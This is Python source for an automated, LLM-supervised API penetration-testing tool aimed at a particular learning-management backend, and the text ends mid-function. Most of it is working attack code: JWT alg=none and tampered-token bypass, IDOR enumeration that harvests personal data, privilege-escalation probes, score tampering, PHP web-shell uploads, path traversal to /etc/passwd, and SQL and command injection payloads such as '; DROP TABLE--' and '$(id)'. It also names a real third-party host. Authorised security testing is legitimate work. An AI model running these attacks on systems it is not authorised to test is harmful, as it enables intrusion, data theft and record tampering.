#!/usr/bin/env python3
from __future__ import annotations
"""
Vikramaditya Autopilot API Hunt — Brain-Supervised Dynamic VAPT Engine.

Given a base URL and credentials, runs a complete authenticated API
penetration test with an AI supervisor (local LLM) that dynamically
decides what to test next based on findings discovered so far.

Brain supervisor actions:
  CONTINUE — run next planned phase
  INJECT   — add new phase (e.g., IDOR on /view → auto-test /edit, /delete)
  SKIP     — skip irrelevant phase (e.g., skip SSTI if Django ORM confirmed)
  PIVOT    — reorder entire test plan based on discoveries

Works fully deterministic without LLM (--no-brain fallback).

Usage:
    python3 autopilot_api_hunt.py --base-url URL --auth-creds user:pass --with-brain
    python3 autopilot_api_hunt.py --base-url URL --auth-creds user:pass  # no brain
"""

import argparse
import base64
import json
import os
import re
import struct
import sys
import tempfile
import time
from datetime import datetime, timezone
from urllib.parse import urlparse

from auth_utils import RateLimiter, JWTHelper, AuthSession, FindingSaver

# ── Severity constants ────────────────────────────────────────────────────────
CRITICAL, HIGH, MEDIUM, LOW, INFO = "critical", "high", "medium", "low", "info"


def log(level: str, msg: str):
    symbols = {"ok": "+", "err": "-", "warn": "!", "info": "*", "crit": "!!", "phase": "»", "vuln": "VULN"}
    colors = {"ok": "\033[0;32m", "err": "\033[0;31m", "warn": "\033[1;33m",
              "info": "\033[0;36m", "crit": "\033[0;35m", "phase": "\033[0;34m",
              "vuln": "\033[0;31m\033[1m"}
    nc = "\033[0m"
    sym = symbols.get(level, "*")
    col = colors.get(level, "")
    print(f"{col}[{sym}]{nc} {msg}", flush=True)


# ── Brain Scan Context ────────────────────────────────────────────────────────

MAX_PHASES = 30  # Safety cap to prevent infinite injection loops

DEFAULT_PHASE_ORDER = [
    {"phase": "auth_bypass", "priority": 10},
    {"phase": "idor", "priority": 9},
    {"phase": "priv_esc", "priority": 8},
    {"phase": "biz_logic", "priority": 7},
    {"phase": "file_upload", "priority": 6},
    {"phase": "injection", "priority": 5},
    {"phase": "info_disclosure", "priority": 4},
    {"phase": "rate_limit", "priority": 3},
    {"phase": "token_security", "priority": 2},
    {"phase": "timing_oracle", "priority": 1},
]


class BrainScanContext:
    """Shared state between phases and brain supervisor."""

    def __init__(self):
        self.all_findings: list[dict] = []
        self.endpoints: list[dict] = []
        self.test_plan: list[dict] = []
        self.completed_phases: list[str] = []
        self.phase_decisions: list[dict] = []
        self.phases_executed: int = 0

    def summary_for_brain(self) -> str:
        findings_text = "\n".join(
            f"  [{f['severity'].upper()}] {f['type']}: {f['detail'][:60]}"
            for f in self.all_findings[-10:]  # Last 10 findings
        ) or "  (none yet)"
        pending = ", ".join(p["phase"] for p in self.test_plan[:5]) or "(none)"
        done = ", ".join(self.completed_phases) or "(none)"
        return (f"Completed: {done}\n"
                f"Pending: {pending}\n"
                f"Total findings: {len(self.all_findings)}\n"
                f"Recent findings:\n{findings_text}")


def _pick_fast_model() -> str:
    """Pick fastest available Ollama model for per-phase decisions."""
    try:
        import ollama
        for m in ["baron-llm:latest", "gemma4:e4b", "qwen3:8b", "qwen3:14b"]:
            try:
                ollama.show(m)
                return m
            except Exception:
                continue
    except ImportError:
        pass
    return ""


def _brain_create_initial_plan(endpoints: list[dict], with_brain: bool) -> list[dict]:
    """Brain creates prioritized test plan from discovered endpoints."""
    if not with_brain:
        return [dict(p) for p in DEFAULT_PHASE_ORDER]

    model = _pick_fast_model()
    if not model:
        return [dict(p) for p in DEFAULT_PHASE_ORDER]

    # Categorize endpoints
    view_eps = [e for e in endpoints if "view-" in e.get("path", "")]
    edit_eps = [e for e in endpoints if "edit-" in e.get("path", "") or "add-" in e.get("path", "")]
    list_eps = [e for e in endpoints if "list" in e.get("path", "")]
    upload_eps = [e for e in endpoints if "upload" in e.get("path", "") or "video" in e.get("path", "")]
    auth_eps = [e for e in endpoints if any(k in e.get("path", "") for k in ("login", "password", "auth", "token", "reset"))]

    log("info", f"  Brain planning: {len(view_eps)} view, {len(edit_eps)} edit, "
        f"{len(list_eps)} list, {len(upload_eps)} upload, {len(auth_eps)} auth endpoints")

    # Smart ordering based on what's available
    plan = []
    if view_eps:
        plan.append({"phase": "idor", "priority": 10, "reason": f"{len(view_eps)} view endpoints = IDOR targets"})
    plan.append({"phase": "auth_bypass", "priority": 9})
    if auth_eps:
        plan.append({"phase": "rate_limit", "priority": 8, "reason": f"{len(auth_eps)} auth endpoints"})
    plan.append({"phase": "info_disclosure", "priority": 7})
    if upload_eps:
        plan.append({"phase": "file_upload", "priority": 6, "reason": f"{len(upload_eps)} upload endpoints"})
    plan.append({"phase": "biz_logic", "priority": 5})
    plan.append({"phase": "injection", "priority": 4})
    plan.append({"phase": "token_security", "priority": 3})
    plan.append({"phase": "timing_oracle", "priority": 2})
    plan.append({"phase": "priv_esc", "priority": 1})

    for p in plan:
        if p.get("reason"):
            log("info", f"  Brain: {p['phase']} (priority {p['priority']}) — {p['reason']}")

    return plan


def _brain_decide_next(phase_name: str, findings: list[dict],
                        ctx: BrainScanContext) -> dict:
    """Brain decides what to do after a phase completes."""
    model = _pick_fast_model()
    if not model:
        return {"action": "continue", "reason": "No model available"}

    try:
        import ollama
    except ImportError:
        return {"action": "continue", "reason": "Ollama not installed"}

    # Build context
    findings_text = "\n".join(
        f"  [{f['severity'].upper()}] {f['type']}: {f['detail'][:60]}"
        for f in findings
    ) or "  (no findings)"

    pending = [p["phase"] for p in ctx.test_plan[:5]]

    prompt = f"""/no_think
You are a VAPT supervisor. Phase '{phase_name}' just completed.

Phase findings ({len(findings)}):
{findings_text}

Total findings so far: {len(ctx.all_findings)}
Completed phases: {', '.join(ctx.completed_phases)}
Pending phases: {', '.join(pending)}

Pick ONE action (JSON only):
- {{"action":"continue","reason":"why"}} — run next planned phase
- {{"action":"inject","phase":"idor_extended","endpoints":["edit-learner/","delete-learner/"],"reason":"why"}} — add new test
- {{"action":"skip","skip_phase":"phase_name","reason":"why"}} — skip a pending phase

Rules:
- INJECT if you found IDOR on view-* endpoints (test edit-*/delete-* too)
- INJECT if you found score manipulation (test other numeric fields)
- SKIP injection phase if no SQL errors found and Django ORM is confirmed
- SKIP priv_esc if no second account token available
- Default to CONTINUE if no strong signal

Return ONLY JSON, no markdown."""

    try:
        resp = ollama.chat(model=model, messages=[
            {"role": "user", "content": prompt},
        ], options={"num_predict": 200, "temperature": 0.1})

        content = (resp["message"].get("content", "") or
                   resp["message"].get("thinking", "") or "")
        content = re.sub(r'```json\s*', '', content)
        content = re.sub(r'```\s*', '', content)

        match = re.search(r'\{[^{}]*"action"[^{}]*\}', content)
        if match:
            decision = json.loads(match.group(0))
            return decision
    except Exception:
        pass

    return {"action": "continue", "reason": "Brain parse failed — continuing"}


def _run_phase(phase_spec: dict, session: AuthSession, token: str,
               token_b: str, endpoints: list[dict],
               saver: FindingSaver) -> list[dict]:
    """Execute a single phase by name with optional custom endpoints."""
    name = phase_spec["phase"]
    custom_eps = phase_spec.get("endpoints")

    # Build endpoint list for phase
    if custom_eps:
        eps = [{"path": p, "method": "POST", "status": 200} for p in custom_eps]
    else:
        eps = endpoints

    try:
        if name == "auth_bypass":
            return AuthBypassScanner().run(session, eps, token, saver)
        elif name in ("idor", "idor_extended"):
            return IDORScanner().run(session, eps, saver)
        elif name == "priv_esc":
            return PrivEscScanner().run(session, token_b, saver)
        elif name == "biz_logic":
            return BusinessLogicTester().run(session, eps, saver)
        elif name == "file_upload":
            return FileUploadTester().run(session, saver)
        elif name == "injection":
            return InjectionTester().run(session, eps, saver)
        elif name == "info_disclosure":
            return InfoDisclosureScanner().run(session, eps, saver)
        elif name == "rate_limit":
            return RateLimitTester().run(session, saver)
        elif name == "token_security":
            return TokenSecurityTester().run(session, token, saver)
        elif name == "timing_oracle":
            return TimingOracle().run(session, saver)
        else:
            log("warn", f"  Unknown phase: {name}")
            return []
    except Exception as e:
        log("err", f"  Phase {name} failed: {e}")
        return []


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1: ENDPOINT DISCOVERY
# ═══════════════════════════════════════════════════════════════════════════════

class EndpointDiscovery:
    """Discover API endpoints from JS bundles, debug pages, and common patterns."""

    COMMON_ENDPOINTS = [
        "learner-list/", "instructor-list/", "course-list/", "list-package/",
        "app-setting/", "lms-setting-view/", "list-smtp/", "logs-list/", "otp-list/",
        "users-report/", "list-notification/", "ads-list/", "news-list/",
        "list-videos/", "list-live-tests/", "view-learner/", "view-instructor/",
        "view-course/", "chapter-list/", "list-quiz-question/", "quiz-questions/",
        "add-learner/", "edit-learner/", "add-course/", "add-instructor/",
        "add-notification/", "add-smtp/", "change-learner-password/",
        "course-report/", "learner-report/", "generate-live-test-result/",
        "get-aws-sign-upload-video/", "bulk-add-learner/", "delete-course/",
        "delete-smtp/", "learner-course-status/", "learner-package-status/",
        "update-chapter-progress/", "discussion/", "list-discussion/",
        "check-auth/", "logout/",
    ]

    def __init__(self, session: AuthSession, frontend_url: str = None):
        self.session = session
        self.frontend_url = frontend_url
        self.endpoints = []

    def run(self) -> list[dict]:
        log("phase", "Phase 1: Endpoint Discovery")
        discovered = set()

        # 1a. Scrape JS bundles
        if self.frontend_url:
            js_endpoints = self._scrape_js_bundle(self.frontend_url)
            discovered.update(js_endpoints)
            log("info", f"  JS bundle: {len(js_endpoints)} endpoints")

        # 1b. Django debug page
        debug_endpoints = self._scrape_debug_page()
        discovered.update(debug_endpoints)
        log("info", f"  Debug page: {len(debug_endpoints)} endpoints")

        # 1c. Common patterns
        discovered.update(self.COMMON_ENDPOINTS)

        # 1d. Probe each endpoint to check if it exists
        live = []
        for ep in sorted(discovered):
            resp = self.session.request("POST", ep, json_body={})
            if resp["status"] != 404 and resp["status"] != 0:
                live.append({"path": ep, "method": "POST", "status": resp["status"]})

        self.endpoints = live
        log("ok", f"  {len(live)} live endpoints confirmed")
        return live

    def _scrape_js_bundle(self, url: str) -> set:
        """Extract API paths from a React JS bundle."""
        endpoints = set()
        try:
            resp = self.session.request("GET", "", headers={"Host": urlparse(url).netloc})
            # This won't work via the API session — use requests directly
            import requests
            html = requests.get(url, verify=False, timeout=15).text
            js_files = re.findall(r'src="(/static/js/[^"]+\.js)"', html)
            for js_path in js_files:
                js_url = url.rstrip("/") + js_path
                js_content = requests.get(js_url, verify=False, timeout=30).text
                paths = re.findall(r'"([a-z][a-z0-9_-]+/)"', js_content)
                endpoints.update(p for p in paths if 3 < len(p) < 50)
        except Exception:
            pass
        return endpoints

    def _scrape_debug_page(self) -> set:
        """POST to nonexistent endpoint to trigger Django debug page."""
        endpoints = set()
        try:
            import requests
            resp = requests.post(
                f"{self.session.base_url}/nonexistent_vapt_probe/",
                data={}, verify=False, timeout=15
            )
            if "DEBUG = True" in resp.text or "URLconf" in resp.text:
                log("vuln", "  Django DEBUG=True — full URL patterns exposed!")
                paths = re.findall(r'<code>\s*([a-z][a-z0-9_/-]+/)\s*</code>', resp.text)
                endpoints.update(paths)
        except Exception:
            pass
        return endpoints


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2: AUTH BYPASS
# ═══════════════════════════════════════════════════════════════════════════════

class AuthBypassScanner:
    """Test endpoints with no/expired/tampered/alg-none tokens."""

    def run(self, session: AuthSession, endpoints: list[dict], token: str,
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 2: Authentication Bypass Testing")
        findings = []
        sample = endpoints[:20]  # Test top 20 endpoints
        base_url = session.base_url

        # IMPORTANT: create a FRESH Session for bare requests to prevent
        # cookie leakage from the authenticated session's module-level jar
        import requests as _req_mod
        _bare = _req_mod.Session()
        _bare.verify = False
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        for ep in sample:
            path = ep["path"]
            url = f"{base_url}/{path.lstrip('/')}"

            # Baseline: use session (with cookies) to confirm endpoint works
            resp_valid = session.request("POST", path, json_body={})
            if resp_valid["status"] not in (200, 201):
                continue

            # All auth bypass tests use BARE requests (no session cookies)
            # to prevent cf_rt cookie from silently re-authenticating
            tests = {
                "no_auth": ("", CRITICAL, "Endpoint accessible without authentication"),
                "expired": (JWTHelper.expire_token(token), HIGH, "Expired JWT accepted"),
                "tampered": (JWTHelper.tamper_signature(token), HIGH, "Tampered JWT signature accepted"),
                "alg_none": (JWTHelper.set_alg_none(token), CRITICAL, "JWT alg=none bypass"),
            }

            for test_name, (test_token, severity, detail) in tests.items():
                try:
                    if test_token == "":
                        # No auth at all — fresh session, zero cookies
                        r = _bare.post(url, json={}, timeout=15)
                    else:
                        # Only cf_at cookie (NO cf_rt to prevent silent refresh)
                        r = _bare.post(url, json={}, cookies={"cf_at": test_token},
                                       timeout=15)
                    if r.status_code in (200, 201, 204):
                        f = {"type": f"auth_bypass_{test_name}", "severity": severity,
                             "detail": f"{detail} ({path})", "url": url,
                             "evidence": f"{test_name}: HTTP {r.status_code}"}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
                except Exception:
                    pass

        log("ok", f"  {len(findings)} auth bypass findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3: IDOR
# ═══════════════════════════════════════════════════════════════════════════════

class IDORScanner:
    """Sequential ID enumeration on view/edit/delete endpoints."""

    PII_KEYS = {"email", "phone", "contact_no", "first_name", "last_name",
                "address", "dob", "mobile", "name"}

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 3: IDOR Testing")
        findings = []

        idor_targets = [ep for ep in endpoints if any(
            kw in ep["path"] for kw in ("view-", "edit-", "delete-", "report/")
        )]

        for ep in idor_targets[:15]:
            path = ep["path"]
            for test_id in [1, 2, 3, 100]:
                # Try both FormData and JSON (Django APIs typically use FormData)
                for payload in [
                    {"data": {"id": str(test_id)}},
                    {"json_body": {"id": test_id}},
                    {"data": {"id": str(test_id), "course_id": str(test_id)}},
                    {"data": {"learner_id": str(test_id)}},
                ]:
                    resp = session.request("POST", path, **payload)
                    if resp["status"] in (200, 201) and isinstance(resp["body"], dict):
                        body = resp["body"]
                        if body.get("status") is False:
                            continue
                        raw_data = body.get("data", body)
                        # Handle both dict and list responses
                        items = [raw_data] if isinstance(raw_data, dict) else (raw_data[:1] if isinstance(raw_data, list) else [])
                        for data in items:
                            if not isinstance(data, dict):
                                continue
                            exposed = {k for k in data.keys() if k.lower() in self.PII_KEYS}
                            if exposed:
                                sample = ', '.join(f'{k}={data[k]}' for k in list(exposed)[:3] if data.get(k))
                                f = {"type": "idor", "severity": HIGH,
                                     "detail": f"IDOR: id={test_id} exposes PII ({', '.join(exposed)}) on {path}",
                                     "url": resp["url"],
                                     "evidence": f"id={test_id} → {sample}"}
                                findings.append(f)
                                if saver:
                                    saver.save(f)
                                    saver.save_txt(f)
                                break
                        if findings and findings[-1]["detail"].startswith(f"IDOR: id={test_id}"):
                            break  # Found IDOR with this payload format
                if any(f["detail"].startswith(f"IDOR: id={test_id}") for f in findings):
                    break  # One confirmed IDOR per endpoint

        log("ok", f"  {len(findings)} IDOR findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 4: PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════════════════════════

class PrivEscScanner:
    """Test admin endpoints with non-admin token."""

    ADMIN_PATHS = ["app-setting/", "list-smtp/", "add-smtp/", "logs-list/",
                   "otp-list/", "change-learner-password/", "users-report/",
                   "delete-course/", "bulk-add-learner/", "add-instructor/"]

    def run(self, session: AuthSession, non_admin_token: str = None,
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 4: Privilege Escalation Testing")
        findings = []
        if not non_admin_token:
            log("warn", "  No non-admin token — skipping priv esc (need --auth-creds-b)")
            return findings

        for path in self.ADMIN_PATHS:
            resp = session.request("POST", path, token=non_admin_token, json_body={})
            if resp["status"] in (200, 201, 204):
                f = {"type": "privilege_escalation", "severity": CRITICAL,
                     "detail": f"Non-admin accessed admin endpoint {path}",
                     "url": resp["url"],
                     "evidence": f"Learner token → HTTP {resp['status']}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        log("ok", f"  {len(findings)} priv esc findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 5: BUSINESS LOGIC
# ═══════════════════════════════════════════════════════════════════════════════

class BusinessLogicTester:
    """Score manipulation, negative values, pagination abuse."""

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 5: Business Logic Testing")
        findings = []

        # 5a. Score manipulation on any result/score/grade endpoint
        score_endpoints = [ep for ep in endpoints if any(
            kw in ep["path"] for kw in ("result", "score", "grade", "answer", "quiz", "generate")
        )]
        tampered_payloads = [
            {"correct_answers": "999", "wrong_answers": "-5", "total_score": "99999",
             "learner_id": "1", "live_test_id": "1", "total_question": "10",
             "total_marks": "100", "time_spend": "60"},
            {"total_score": "-1", "learner_id": "1", "live_test_id": "1",
             "total_question": "10", "total_marks": "100", "time_spend": "60"},
        ]
        for ep in score_endpoints[:5]:
            for payload in tampered_payloads:
                resp = session.request("POST", ep["path"], data=payload)
                if resp["status"] in (200, 201, 500):
                    body_str = json.dumps(resp["body"], default=str) if isinstance(resp["body"], dict) else str(resp["body"])
                    # Detect: server accepted invalid values (constraint error = values were inserted)
                    # OR success response = values accepted without validation
                    # 500 with constraint error = values reached DB but failed on a DIFFERENT column
                    accepted = (isinstance(resp["body"], dict) and resp["body"].get("status") is True)
                    constraint_error = any(kw in body_str for kw in
                        ["not-null constraint", "violates", "Failing row", "foreign key",
                         "DETAIL:", "organization_"])
                    if accepted or constraint_error:
                        tampered_fields = [f"{k}={v}" for k, v in payload.items()
                                           if v in ("999", "-5", "99999", "-1")]
                        evidence = f"{', '.join(tampered_fields)} → HTTP {resp['status']}"
                        if constraint_error:
                            evidence += f" (DB error confirms values inserted: {body_str[:100]})"
                        f = {"type": "score_manipulation", "severity": HIGH,
                             "detail": f"Server accepted tampered values ({', '.join(tampered_fields)}) on {ep['path']}",
                             "url": resp["url"], "evidence": evidence}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
                        break  # One confirmed per endpoint

        # 5b. Pagination abuse
        list_endpoints = [ep for ep in endpoints if ep["path"].startswith("list") or ep["path"].endswith("list/")]
        for ep in list_endpoints[:5]:
            resp = session.request("POST", ep["path"], json_body={"page": 1, "page_size": 99999})
            if resp["status"] == 200:
                body_str = json.dumps(resp["body"], default=str) if isinstance(resp["body"], dict) else str(resp["body"])
                if len(body_str) > 50000:
                    f = {"type": "pagination_abuse", "severity": MEDIUM,
                         "detail": f"Excessive data with page_size=99999 ({ep['path']})",
                         "url": resp["url"], "evidence": f"Response: {len(body_str)} chars"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)

        log("ok", f"  {len(findings)} business logic findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6: FILE UPLOAD
# ═══════════════════════════════════════════════════════════════════════════════

class FileUploadTester:
    """Test file upload endpoints for bypass vulnerabilities."""

    def run(self, session: AuthSession, saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 6: File Upload Testing")
        findings = []

        # Test S3 presigned URL for arbitrary file types
        for ext, ctype in [("html", "text/html"), ("php", "application/x-php"),
                           ("py", "text/x-python"), ("jsp", "application/x-jsp"),
                           ("svg", "image/svg+xml"), ("../../../etc/passwd", "text/plain")]:
            resp = session.request("POST", "get-aws-sign-upload-video/",
                                   data={"filename": f"test.{ext}", "type": ctype,
                                         "organization_video": "test",
                                         "total_video_length": "1", "course_id": "1"})
            if resp["status"] == 200 and isinstance(resp["body"], dict) and resp["body"].get("uploadUrl"):
                f = {"type": "arbitrary_upload", "severity": HIGH,
                     "detail": f"S3 presigned URL generated for .{ext} ({ctype})",
                     "url": resp["body"]["uploadUrl"][:100],
                     "evidence": f"Filename=test.{ext} accepted"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
                # Extract AWS key
                url = resp["body"]["uploadUrl"]
                key_match = re.search(r"Credential=([A-Z0-9]+)%2F", url)
                bucket_match = re.search(r"https://([^/]+)\.s3\.", url)
                if key_match:
                    f2 = {"type": "aws_key_exposed", "severity": HIGH,
                          "detail": f"AWS Access Key ID exposed: {key_match.group(1)}",
                          "url": url[:80], "evidence": f"Key in presigned URL"}
                    findings.append(f2)
                    if saver:
                        saver.save(f2)
                        saver.save_txt(f2)
                break  # One confirmed is enough for S3

        # Test profile image upload bypass
        php_content = b'<?php echo "VAPT_TEST"; ?>'
        for test_name, filename, content in [
            ("double_ext", "shell.php.jpg", php_content),
            ("mime_mismatch", "phpinside.jpg", php_content),
        ]:
            tmp = tempfile.NamedTemporaryFile(suffix=f"_{filename}", delete=False)
            tmp.write(content)
            tmp.close()
            try:
                import requests as _req
                cookies = dict(session._session.cookies) if hasattr(session, '_session') else {}
                resp_raw = _req.post(
                    f"{session.base_url}/add-learner/",
                    files={"image": (filename, open(tmp.name, "rb"), "image/jpeg")},
                    data={"first_name": "VAPTTest", "last_name": "Upload",
                          "email": f"vapt_{test_name}_{int(time.time())}@test.com",
                          "contact_no": f"98765{int(time.time())%100000:05d}",
                          "country_code": "IN"},
                    cookies=cookies, verify=False, timeout=15
                )
                if resp_raw.status_code == 200:
                    body = resp_raw.json()
                    if body.get("status") is True:
                        f = {"type": f"upload_bypass_{test_name}", "severity": HIGH,
                             "detail": f"PHP content accepted in {filename}",
                             "url": f"{session.base_url}/add-learner/",
                             "evidence": f"{filename} with PHP content → 'registered successfully'"}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
            except Exception:
                pass
            finally:
                os.unlink(tmp.name)

        log("ok", f"  {len(findings)} upload findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 7: INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

class InjectionTester:
    """SQLi, SSTI, command injection on key parameters."""

    SQLI_PAYLOADS = ["' OR 1=1--", "' UNION SELECT 1--", "'; DROP TABLE--",
                     "1' AND (SELECT 1 FROM pg_sleep(3))--"]
    SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "#{7*7}", "{% debug %}"]
    CMD_PAYLOADS = ["; id", "| id", "$(id)", "`id`"]

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 7: Injection Testing")
        findings = []

        # 7a. SQLi on search/filter params
        search_endpoints = [ep for ep in endpoints if any(
            kw in ep["path"] for kw in ("list", "report", "view")
        )][:10]

        for ep in search_endpoints:
            for payload in self.SQLI_PAYLOADS[:2]:
                start = time.monotonic()
                resp = session.request("POST", ep["path"],
                                       json_body={"search": payload})
                elapsed = time.monotonic() - start
                if elapsed > 3.0:
                    f = {"type": "sqli_time_based", "severity": CRITICAL,
                         "detail": f"Time-based SQLi: {elapsed:.1f}s delay on {ep['path']}",
                         "url": resp["url"],
                         "evidence": f"search='{payload}' → {elapsed:.1f}s (baseline <0.5s)"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)
                body_str = str(resp.get("body", ""))
                if "syntax error" in body_str.lower() or "sql" in body_str.lower():
                    f = {"type": "sqli_error_based", "severity": HIGH,
                         "detail": f"SQL error in response on {ep['path']}",
                         "url": resp["url"],
                         "evidence": f"search='{payload}' → SQL error in response"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)

        # 7b. SQLi on login
        login_payloads = [("' OR 1=1--", "test"), ("admin'--", "test")]
        for email, pwd in login_payloads:
            import requests as _req
            resp = _req.post(f"{session.base_url}/login-view/",
                             data={"email": email, "password": pwd},
                             verify=False, timeout=10)
            if resp.status_code == 200:
                try:
                    body = resp.json()
                    if body.get("status") is True:
                        f = {"type": "sqli_auth_bypass", "severity": CRITICAL,
                             "detail": f"SQL injection bypassed login with email='{email}'",
                             "url": f"{session.base_url}/login-view/",
                             "evidence": f"email='{email}' → login success"}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
                except Exception:
                    pass

        log("ok", f"  {len(findings)} injection findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 8: INFO DISCLOSURE
# ═══════════════════════════════════════════════════════════════════════════════

class InfoDisclosureScanner:
    """Debug pages, error messages, server headers, credential leaks."""

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 8: Information Disclosure Testing")
        findings = []

        # 8a. Django DEBUG page
        import requests as _req
        try:
            resp = _req.post(f"{session.base_url}/nonexistent_probe/",
                             data={}, verify=False, timeout=10)
            if "DEBUG = True" in resp.text:
                f = {"type": "django_debug", "severity": CRITICAL,
                     "detail": "Django DEBUG=True — tracebacks, settings, URL patterns exposed",
                     "url": f"{session.base_url}/nonexistent_probe/",
                     "evidence": "DEBUG=True in response, ALLOWED_HOSTS visible"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
        except Exception:
            pass

        # 8b. Server header disclosure
        try:
            resp = _req.head(session.base_url, verify=False, timeout=10)
            server = resp.headers.get("Server", "")
            if server and any(v in server.lower() for v in ("nginx/", "apache/", "gunicorn", "iis/")):
                f = {"type": "server_version", "severity": LOW,
                     "detail": f"Server version disclosed: {server}",
                     "url": session.base_url, "evidence": f"Server: {server}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
        except Exception:
            pass

        # 8c. SMTP credentials
        resp = session.request("POST", "list-smtp/", json_body={})
        if resp["status"] == 200 and isinstance(resp["body"], dict):
            data = resp["body"].get("data", [])
            if isinstance(data, list) and data:
                smtp_info = data[0] if isinstance(data[0], dict) else {}
                if smtp_info.get("smtp_server") or smtp_info.get("smtp_user"):
                    f = {"type": "smtp_credential_exposure", "severity": MEDIUM,
                         "detail": f"SMTP credentials exposed: {smtp_info.get('smtp_server')} / {smtp_info.get('smtp_user')}",
                         "url": f"{session.base_url}/list-smtp/",
                         "evidence": f"smtp_server={smtp_info.get('smtp_server')}"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)

        # 8d. Verbose error messages (DB schema leak)
        resp = session.request("POST", "generate-live-test-result/",
                               data={"learner_id": "1", "live_test_id": "1"})
        body_str = json.dumps(resp["body"], default=str) if isinstance(resp["body"], dict) else str(resp["body"])
        if any(kw in body_str for kw in ("violates not-null constraint", "DETAIL:", "Failing row",
                                          "foreign key constraint", "relation \"", "column \"")):
            f = {"type": "db_schema_leak", "severity": HIGH,
                 "detail": "PostgreSQL error messages leak table/column names and row data",
                 "url": resp["url"],
                 "evidence": body_str[:200]}
            findings.append(f)
            if saver:
                saver.save(f)
                saver.save_txt(f)

        # 8e. Keycloak admin console
        try:
            resp_kc = _req.get("https://auth.cyberfrat.com/admin/master/console/",
                               verify=False, timeout=10)
            if resp_kc.status_code == 200:
                f = {"type": "keycloak_admin_exposed", "severity": HIGH,
                     "detail": "Keycloak admin console accessible",
                     "url": "https://auth.cyberfrat.com/admin/master/console/",
                     "evidence": f"HTTP {resp_kc.status_code}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
        except Exception:
            pass

        log("ok", f"  {len(findings)} info disclosure findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 9: RATE LIMITING
# ═══════════════════════════════════════════════════════════════════════════════

class RateLimitTester:
    """Test rate limiting on authentication and sensitive endpoints."""

    SENSITIVE_PATHS = ["login-view/", "change-learner-password/",
                       "reset-password-request/"]

    def run(self, session: AuthSession, saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 9: Rate Limiting Testing")
        findings = []
        import requests as _req

        for path in self.SENSITIVE_PATHS:
            statuses = []
            for i in range(10):
                try:
                    if path == "login-view/":
                        resp = _req.post(f"{session.base_url}/{path}",
                                         data={"email": "test@test.com", "password": "wrong"},
                                         verify=False, timeout=5)
                    else:
                        cookies = dict(session._session.cookies) if hasattr(session, '_session') else {}
                        resp = _req.post(f"{session.base_url}/{path}",
                                         data={"email": "test@test.com", "id": "1"},
                                         cookies=cookies, verify=False, timeout=5)
                    statuses.append(resp.status_code)
                    if resp.status_code == 429:
                        break
                except Exception:
                    break

            if 429 not in statuses and len(statuses) >= 8:
                f = {"type": "missing_rate_limit", "severity": MEDIUM,
                     "detail": f"No rate limiting on {path} after {len(statuses)} rapid requests",
                     "url": f"{session.base_url}/{path}",
                     "evidence": f"{len(statuses)} requests, statuses: {set(statuses)}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        log("ok", f"  {len(findings)} rate limit findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 10: TOKEN SECURITY
# ═══════════════════════════════════════════════════════════════════════════════

class TokenSecurityTester:
    """JWT analysis and refresh token abuse."""

    def run(self, session: AuthSession, token: str,
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 10: Token Security Testing")
        findings = []

        payload = JWTHelper.decode_payload(token)
        header = JWTHelper.decode_header(token)

        # 10a. Token analysis
        log("info", f"  JWT alg: {header.get('alg')}, exp: {payload.get('exp')}")
        exp = payload.get("exp", 0)
        iat = payload.get("iat", 0)
        if exp and iat:
            lifetime = exp - iat
            if lifetime > 86400:
                f = {"type": "long_token_lifetime", "severity": MEDIUM,
                     "detail": f"JWT lifetime too long: {lifetime}s ({lifetime//3600}h)",
                     "url": session.base_url, "evidence": f"exp-iat={lifetime}s"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        # 10b. Refresh token abuse (tampered access + valid refresh)
        tampered = JWTHelper.tamper_signature(token)
        cookies = dict(session._session.cookies) if hasattr(session, '_session') else {}
        cf_rt = cookies.get("cf_rt", "")
        if cf_rt:
            import requests as _req
